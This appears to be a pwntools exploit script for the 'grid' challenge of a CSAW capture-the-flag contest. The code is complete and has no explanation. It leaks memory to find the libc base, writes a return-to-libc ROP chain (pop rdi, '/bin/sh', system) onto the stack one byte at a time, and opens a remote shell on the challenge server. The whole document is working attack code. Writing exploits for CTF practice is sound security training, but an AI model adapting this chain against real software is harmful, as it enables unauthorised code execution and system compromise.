from pwn import *

context.update(arch='amd64', os='linux')
context.terminal = ['iterm2', 'new-window']

HOST, PORT = 'pwn.chal.csaw.io', 5013
BINARY = './grid'
LIBC = './libc-2.27.so'

elf  = ELF(BINARY, checksec=False)
libc = ELF(LIBC, checksec=False)

if args.REMOTE:
	p = remote(HOST, PORT)
else:
	p = remote('127.0.0.1',9997)

def send(shape,loc1,loc2):
	p.recvuntil('>')
	p.sendline(shape)
	p.recvuntil('>')
	p.sendline(loc1)
	p.sendline(loc2)

def leak():
	p.recvuntil('shape>')
	p.sendline('d')
	return p.recvuntil('shape')[12:-5]

def send_32addr(addr, i ):
	send(chr(addr&0xff),'10',str(i))
	send(chr((addr&0xffff)>>8),'10',str(i+1))
	send(chr((addr&0xffffff)>>16),'10',str(i+2))
	for j in range(i+3,i+8):
		send('\x00','10',str(j))

def send_64addr(addr, i):
	send(chr(addr&0xff),'10',str(i))
	send(chr((addr&0xffff)>>8),'10',str(i+1))
	send(chr((addr&0xffffff)>>16),'10',str(i+2))
	send(chr((addr&0xffffffff)>>24),'10',str(i+3))

	send(chr((addr&0xffffffffff)>>32),'10', str(i+4))
	send(chr((addr&0xffffffffffff)>>40),'10',str(i+5))
	send('\x00','10',str(i+6))
	send('\x00','10',str(i+7))

send('1','1','1')
print('here')
l = ''.join(leak().split(b'\n')[:-1])
leaks = [u64(l[i:i+8]) for i  in range(0,96,8)]
print(leaks)
rop = ROP('./grid')
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]

# libc.address = leaks[0] + 0x39d5
libc.address = leaks[0] - 0x77662b
ret = leaks[4]-312
rdi = ret-280
system = libc.sym['system']
binsh = next(libc.search("/bin/sh"))
ret = (rop.find_gadget(['ret']))[0]

info('system: %s',system)
info('ret: %s',hex(ret))



send_32addr(ret,20)

info('ret done')

send_32addr(pop_rdi,28)

info('pop rdi done')

send_64addr(binsh, 28+8)
info('binsh done')

send_64addr(system,28+16)


info('system done')
# p.sendline('d') #shell
p.interactive()
